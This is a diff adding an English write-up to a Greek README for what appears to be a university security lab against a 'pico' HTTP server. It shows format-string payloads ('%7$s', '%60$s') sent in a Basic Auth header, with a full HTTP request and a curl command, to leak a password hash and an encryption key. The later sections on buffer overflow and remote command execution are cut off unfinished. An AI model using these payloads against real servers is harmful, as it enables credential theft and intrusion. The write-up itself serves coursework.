@@ -12,11 +12,9 @@
 Tasks:
 
 1. Βρείτε το MD5 digest του plaintext password
-1. Βρείτε το plaintext password
-1. Βρείτε το περιεχόμενο του αρχείου `/etc/secret` στον server
-1. Βρείτε το αποτέλεσμα της εντολής `lspci` στον server
-
-
+2. Βρείτε το plaintext password
+3. Βρείτε το περιεχόμενο του αρχείου `/etc/secret` στον server
+4. Βρείτε το αποτέλεσμα της εντολής `lspci` στον server
 
 
 ### Παρατηρήσεις
@@ -80,17 +78,94 @@ Tasks:
 
 - Αν θέλετε hints ρωτήστε privately (χωρίς βαθμολογική συνέπεια, σε λογικά πλαίσια).
 
+## Report
+
+### TASK 1 -- Information Leak
+------------------------------
+
+**TARGET**: Find the MD5 digest of the admin user's password.
+
+The MD5 of the password exists in the code when checks are being made.
+
+Format string vulnerability on the `check_auth()` function of `pico` server.
+
+```c
+  // check if user is found
+  if(password_md5 == NULL) {
+    printf("HTTP/1.1 401 Unauthorized\r\n");
+    printf("WWW-Authenticate: Basic realm=\"");
+    printf("Invalid user: ");
+    printf(auth_username);
+    printf("\"\r\n\r\n");
+
+    free(auth_decoded);
+    return 0;
+  }
+```
+
+++
+Here after we pass an invalid user in the base64 encoded Basic Auth string pair we get a message that informs us of the invalid username we gave. There we have a format string vulnerability in the `printf()`.  
+We can use that to leak information from the stack. Observing the pico server binary we can figure out that the MD5 password value is on the 7th position in the stack when the vulnerable `printf()` is executed.  
+Formulate a base64 Auth string with `%7$s:hello` and perform a GET request at the root route of the server.
+
+We get back the MD5 hash of the password in the HTTP response.
+
+
+### TASK 2 -- Password Decryption
+------------------------------
+
+2 ways to extract the key.
+
+### Intended
+
+As we can see at the main function of pico the `encryption_key` is fetched and stored in a local variable.
+`%60$s:hello` we find the location where the key is stored in the memory and leak it.
+
+Then we create a decryptor program in C that utilizes the `decrypt()` function where we pass as paramaters the key we extracted and the inital encrypted admin password we were provided.
+
+```http
+GET / HTTP/1.1
+Host: project-2.csec.chatzi.org:8000
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:103.0) Gecko/20100101 Firefox/103.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+DNT: 1
+Authorization: Basic JTYwJHM6aGVsbG8=
+Connection: close
+Upgrade-Insecure-Requests: 1
+Sec-GPC: 1
+```
+
+```bash
+# and in curl
+(curl http://project-2.csec.chatzi.org:8000/ -H 'Authorization: Basic JTY0JHM6aGVsbG8=' -v)
+```
+
+
+### TASK 3 -- Local File Read
+------------------------------
+
+```gdb
+Canary                        : ✓ (value: 0xc7726700)
+NX                            : ✓ 
+PIE                           : ✓ 
+Fortify                       : ✘ 
+RelRO                         : Full
+```
 
 
 
-### Report
+We already have a format string vulnerability identified in the executable which we know how to trigger. This allows us to extract information for the context of execution of the binary. We can leak an incredible amount of stack values which in x86 are gonna be very useful since they encapsulate what has been pushed in the stack on runtime.
 
-Προς συμπλήρωση:
+In order to capitalize on this we need to identify a second vulnerability which allows us to redirect the execution.
 
-Απαντήσεις:
-1. ...
-1. ...
-1. ...
-1. ...
+#### POST -- post_param
+------------------------------
 
-...
+We can perform a buffer overflow attack on 
+
+In the pico servers code, we identify an HTTP POST route which `post_param()`
+
+### TASK 4 -- lspci aka Remote Command Execution
+------------------------------
